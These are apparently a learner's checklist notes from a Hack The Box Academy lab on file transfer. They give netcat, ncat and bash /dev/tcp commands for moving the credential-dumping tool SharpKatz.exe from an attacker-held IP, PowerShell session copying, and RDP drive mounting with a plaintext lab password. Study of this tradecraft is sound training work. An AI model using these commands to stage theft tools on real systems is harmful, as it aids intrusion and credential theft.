- [ ] NetCat
```sh
# listerner
nc -lp 8000 > outSharpKatz.exe
nc -lp 8000 < inSharpKatz.exe
ncat -lp 8000 --recv-only > outSharpKatz.exe
# sending the file
nc IP 8000 > outSharpKatz.exe
nc IP 8000 < inSharpKatz.exe
nc -q 0 IP 8000 < inSharpKatz.exe
ncat --send-only 192.168.49.128 8000 < inSharpKatz.exe
# netcat with bash /dev/tcp
nc -lp 443 -q 0 < SharpKatz.exe
ncat -lp 443 --send-only < inSharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > outSharpKatz.exe
```
- [ ] PowerShell Session File Transfer
![[Pasted image 20250609085152.png]]
```powershell
# Test connectivity
Test-NetConnection -ComputerName DATABASE01 -Port 5985
# create session
$Session = New-PSSession -ComputerName DATABASE01
# copy from local to the session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
# copy from the session to the local
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
- [ ] RDP
![[Pasted image 20250609085506.png]]
Linux!!!!
```sh
# rdesktop
rdesktop 10.129.201.55 -d HTB -u administrator -p 'HTB_@cademy_stdnt!' -r disk:linux='/home/user/rdesktop/files'
# xfreerdp
xfreerdp /v:10.129.201.55 /d:HTB /u:administrator /p:'HTB_@cademy_stdnt!' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
![[Pasted image 20250609113318.png]]
Windows!!!
```sh
mstsc.exe RDP client
mount local resources
```



